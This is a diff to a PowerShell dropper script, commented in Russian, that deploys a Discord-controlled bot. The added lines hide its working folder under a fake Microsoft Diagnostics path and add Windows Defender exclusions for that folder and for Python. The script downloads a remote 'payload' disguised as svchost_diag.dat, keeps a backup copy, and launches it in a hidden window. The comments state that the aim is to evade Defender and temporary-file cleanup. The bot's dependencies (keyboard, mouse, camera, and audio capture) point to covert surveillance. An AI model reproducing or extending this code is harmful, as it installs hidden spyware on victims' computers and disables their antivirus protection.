@@ -33,7 +33,7 @@ if (-not (Test-Path $pyPath)) {
 $deps = @(
     "discord.py", "keyboard", "mouse", "psutil", "pyttsx3",
     "requests", "pywin32", "pycryptodome", "Pillow", "comtypes",
-    "pycaw", "opencv-python", "pyaudio"
+    "pycaw", "opencv-python", "pyaudio", "PyNaCl"
 )
 Log "Installing deps..."
 & $pyPath -m pip install --upgrade pip -q 2>&1 | Out-Null
@@ -43,17 +43,40 @@ Log "Deps done"
 # Скрыть каталог Python
 attrib +h +s "$env:LOCALAPPDATA\Programs\Python" | Out-Null
 
-# Скачать payload как .dat (Defender меньше реагирует на не-py расширение)
-$botPath = "$env:TEMP\svchost_diag.dat"
+# Постоянная директория вместо TEMP (защита от Storage Sense, очистки временных файлов и Defender)
+$workDir = "$env:LOCALAPPDATA\Microsoft\Windows\Diagnostics"
+if (-not (Test-Path $workDir)) {
+    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+}
+attrib +h +s $workDir | Out-Null
+
+# Исключения Defender (если есть доступ)
+Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "pythonw.exe" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "python.exe" -ErrorAction SilentlyContinue
+
+# Скачать payload в постоянную папку
+$botPath = "$workDir\svchost_diag.dat"
 $repoUrl = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
 Log "Downloading payload..."
-$wc2 = New-Object Net.WebClient
-$wc2.DownloadFile($repoUrl, $botPath)
-Log "Payload saved: $botPath"
+try {
+    $wc2 = New-Object Net.WebClient
+    $wc2.DownloadFile($repoUrl, $botPath)
+    Log "Payload saved: $botPath"
+} catch {
+    Log "Download failed, checking local copy..."
+}
 
-# Запуск через pythonw.exe (не RuntimeBroker — Defender бьёт хуристикой)
-# exec через -c чтобы не было .py процесса в памяти с именем файла
+# Резервная копия
+$backupPath = "$env:APPDATA\Microsoft\Windows\svchost_diag.dat"
+if (Test-Path $botPath) {
+    Copy-Item -Path $botPath -Destination $backupPath -Force -ErrorAction SilentlyContinue
+} elseif (Test-Path $backupPath) {
+    Copy-Item -Path $backupPath -Destination $botPath -Force -ErrorAction SilentlyContinue
+}
+
+# Запуск через pythonw.exe
 $args = "-W ignore -c `"exec(open(r'$botPath', encoding='utf-8').read())`""
 Start-Process -FilePath $pyw -ArgumentList $args -WindowStyle Hidden
-Log "Bot launched via pythonw.exe -c exec(open(dat).read())"
+Log "Bot launched via pythonw.exe from $botPath"
 Log "=== deploy done ==="
